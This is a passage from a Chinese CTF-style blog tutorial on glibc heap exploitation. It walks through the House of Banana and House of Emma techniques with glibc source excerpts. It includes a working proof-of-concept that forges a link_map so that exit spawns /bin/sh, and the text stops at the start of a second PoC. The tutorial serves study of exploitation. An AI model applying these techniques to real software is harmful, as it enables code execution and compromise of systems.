class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">			    			(<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    		+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  				<span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    	/ <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">			  			<span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">				    		((<span class="type">fini_t</span>) array[i]) ();</span><br><span class="line">					&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>控制 <code>array</code> 和 <code>i</code></li>
</ul>
<p>在 <code>fake+0x110</code> 写入的内容会直接控制 <code>array</code>，在 <code>fake+0x120</code> 写入的内容会控制<code>i</code>，只要把<code>fake+0x120，fake+0x110</code> 控制好就可以控制最后的<code>((fini_t) array[i]) ();</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">link_map</span></span><br><span class="line">&#123;</span><br><span class="line"> [...]</span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">ElfW</span>(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line"> [...]   </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	[...]</span><br><span class="line">			<span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">			&#123;</span><br><span class="line">			  <span class="built_in">ElfW</span>(Addr) *array =</span><br><span class="line">			    (<span class="built_in">ElfW</span>(Addr) *) (l-&gt;l_addr</span><br><span class="line">					    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">					    / <span class="built_in">sizeof</span> (<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">			  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			    ((<span class="type">fini_t</span>) array[i]) ();</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		      <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">		      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">				<span class="built_in">DL_CALL_DT_FINI</span>(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">		    &#125;</span><br><span class="line">	[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>需要在<code>fake+0x110</code>写入一个 <code>ptr</code>，且 <code>ptr+0x8</code> 处有 <code>ptr2</code>，<code>ptr2</code> 处写入的是最后要执行的函数地址，需要在<code>fake+0x120</code>写入一个<code>ptr</code>，且 <code>ptr+0x8</code> 处是<code>i*8</code>。例如<code>fake+0x110</code>写入<code>fake+0x40</code>，在<code>fake+0x48</code>写入<code>fake+0x58</code>，在<code>fake+0x58</code>写入 <code>shell</code>，在<code>fake+0x120</code>写入<code>fake+0x48</code>，在<code>fake+0x50</code>处写入 <code>8</code>。</p>
<h2 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a><a class="link"   href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">getLibcBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> to;</span><br><span class="line">    <span class="type">uint64_t</span> from;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line"></span><br><span class="line">    FILE* file;</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/maps&quot;</span>,(<span class="type">int</span>)<span class="built_in">getpid</span>());</span><br><span class="line">    file = <span class="built_in">fopen</span>(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fgets</span>(buf, <span class="built_in">sizeof</span>(buf), file))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;libc&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">            <span class="built_in">fclose</span>(file);</span><br><span class="line">            <span class="keyword">return</span> from;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdin,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stderr,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> libcBase    = <span class="built_in">getLibcBase</span>();</span><br><span class="line">    <span class="comment">// ldBase + 0x2e060</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *	rtld_global_ptr与libc_base的偏移在本地与远程并不是固定的，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得		*	到远程环境的精确偏移</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">uint64_t</span> rtld_global = libcBase + <span class="number">0x23b060</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line">    <span class="type">uint64_t</span>* next_node = (<span class="type">uint64_t</span>*)(rtld_global<span class="number">-0x49048</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">    <span class="type">uint64_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="type">uint64_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)p2<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x28</span>)  = fake;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x31c</span>) = <span class="number">0x1c</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x110</span>) = fake+<span class="number">0x40</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x48</span>)  = fake+<span class="number">0x58</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x58</span>)  = (<span class="type">uint64_t</span>)shell;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x120</span>) = fake+<span class="number">0x48</span>;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x50</span>)  = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="type">uint64_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);           <span class="comment">//force p1 insert in to the largebin</span></span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    p1[<span class="number">3</span>] = ((<span class="type">uint64_t</span>)next_node <span class="number">-0x20</span>);    <span class="comment">//push p2 into unsoteded bin</span></span><br><span class="line">    <span class="type">uint64_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);           <span class="comment">//force p2 insert in to the largebin</span></span><br><span class="line"></span><br><span class="line">    p2[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">3</span>] = fake;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-Emma"><a href="#House-of-Emma" class="headerlink" title="House of Emma"></a>House of Emma</h1><p><code>glibc &gt; 2.23</code>。</p>
<h2 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h2><p>在 <code>vtable</code> 段中存在一个<code> _IO_cookie_jumps</code>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> _IO_cookie_jumps libio_vtable = &#123;</span><br><span class="line">	JUMP_INIT_DUMMY,</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(finish, _IO_file_finish),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(overflow, _IO_file_overflow),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(underflow, _IO_file_underflow),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(uflow, _IO_default_uflow),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(pbackfail, _IO_default_pbackfail),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(xsputn, _IO_file_xsputn),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(xsgetn, _IO_default_xsgetn),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(seekoff, _IO_cookie_seekoff),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(seekpos, _IO_default_seekpos),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(setbuf, _IO_file_setbuf),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(sync, _IO_file_sync),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(doallocate, _IO_file_doallocate),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(read, _IO_cookie_read),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(write, _IO_cookie_write),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(seek, _IO_cookie_seek),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(close, _IO_cookie_close),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(stat, _IO_default_stat),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(showmanyc, _IO_default_showmanyc),</span><br><span class="line">    <span class="built_in">JUMP_INIT</span>(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>_IO_cookie_file</code> 有如下定义：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> __fp;</span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_cookie_io_functions_t</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure></div>

<p>其中的函数定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> _IO_ssize_t</span><br><span class="line">_IO_cookie_read (_IO_FILE *fp, <span class="type">void</span> *buf, _IO_ssize_t size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> _IO_ssize_t</span><br><span class="line">_IO_cookie_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, _IO_ssize_t size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_ssize_t n = <span class="built_in">write_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> _IO_off64_t</span><br><span class="line">_IO_cookie_seek (_IO_FILE *fp, _IO_off64_t offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">	   || (<span class="built_in">seek_cb</span> (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">	       == <span class="number">-1</span>)</span><br><span class="line">	   || offset == (_IO_off64_t) <span class="number">-1</span>)</span><br><span class="line">	  ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">close_cb</span> (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到上面代码的函数调用前都被<code>PTR_DEMANGLE</code>加密了，其定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure></div>

<p>这段宏定义的操作是将函数指针 <code>ROR</code> 循环右移 <code>11</code> 位然后与 <code>fs:[0x30]</code> 异或得到真正的函数地址。解密时首先异或 <code>pointer_guard</code>，然后循环左移 <code>0x11</code> 位。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sysdeps/x86_64/nptl/tls.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">  <span class="type">void</span> *tcb;    <span class="comment">/* 指向TCB */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;       <span class="comment">/* 指向dtv数组 */</span></span><br><span class="line">  <span class="type">void</span> *self;   <span class="comment">/* 指向自身  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;    <span class="comment">/* canary值 */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;  <span class="comment">/* 用于保护指针 */</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>fs:[0x28]</code> 是 <code>tls</code> 上存储的 <code>canary</code>，根据 <code>tcbhead_t</code> 结构体的定义，<code>fs[0x30]</code> 是 <code>pointer_guard</code> ，用于对指针进行加密。我们可以先泄露堆地址和 <code>libc</code> 基地址，然后利用 <code>large bin attack</code> 在 <code>tls</code> 对应 <code>pointer_guard</code> 上写一个 <code>chunk</code> 地址，从而绕过指针保护。除此之外还需要让 <code>_lock</code>指向一块可写内存。</p>
<p><strong>调用链如下</strong>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  <span class="built_in">fflush</span> (stderr);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__fxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="built_in">va_start</span> (ap, fmt);</span><br><span class="line">  <span class="type">int</span> res = __vfxprintf (fp, fmt, ap, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">va_end</span> (ap);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__vfxprintf (FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span><br><span class="line">	     <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">    fp = stderr;</span><br><span class="line">  _IO_flockfile (fp);</span><br><span class="line">  <span class="type">int</span> res = <span class="built_in">locked_vfxprintf</span> (fp, fmt, ap, mode_flags);</span><br><span class="line">  _IO_funlockfile (fp);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">locked_vfxprintf</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *fmt, va_list ap,</span></span></span><br><span class="line"><span class="params"><span class="function">		  <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_fwide (fp, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> __vfprintf_internal (fp, fmt, ap, mode_flags);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> vfprintf	__vfprintf_internal</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap, <span class="type">unsigned</span> <span class="type">int</span> mode_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">outstring</span> ((<span class="type">const</span> UCHAR_T *) format,</span><br><span class="line">	     lead_str_end - (<span class="type">const</span> UCHAR_T *) format);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> outstring(String, Len)                          \</span></span><br><span class="line"><span class="meta">    do &#123;                                                \</span></span><br><span class="line"><span class="meta">        const void *string_ = (String);                 \</span></span><br><span class="line"><span class="meta">        done = outstring_func(s, string_, (Len), done); \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (done &lt; 0)                                   \</span></span><br><span class="line"><span class="meta">            goto all_done;                              \</span></span><br><span class="line"><span class="meta">    &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> PUT(F, S, N)	_IO_sputn ((F), (S), (N))  </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">outstring_func</span> <span class="params">(FILE *s, <span class="type">const</span> UCHAR_T *string, <span class="type">size_t</span> length, <span class="type">int</span> done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">assert</span> ((<span class="type">size_t</span>) done &lt;= (<span class="type">size_t</span>) INT_MAX);</span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">size_t</span>) <span class="built_in">PUT</span> (s, string, length) != (<span class="type">size_t</span>) (length))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">done_add_func</span> (length, done);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>利用条件</strong>：</p>
<ul>
<li>或者可以进行任意地址写堆地址；</li>
<li>可以触发 <code>IO</code> 流操作。</li>
</ul>
<h2 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a><a class="link"   href="https://blog.csdn.net/qq_54218833/article/details/126401517" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h2><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GETSHELL_MODE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORW_MODE 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// IMPORTANT! YOU CAN CHANGE THE MODE HERE</span></span><br><span class="line"><span class="type">int</span> mode = ORW_MODE;</span><br><span class="line"><span 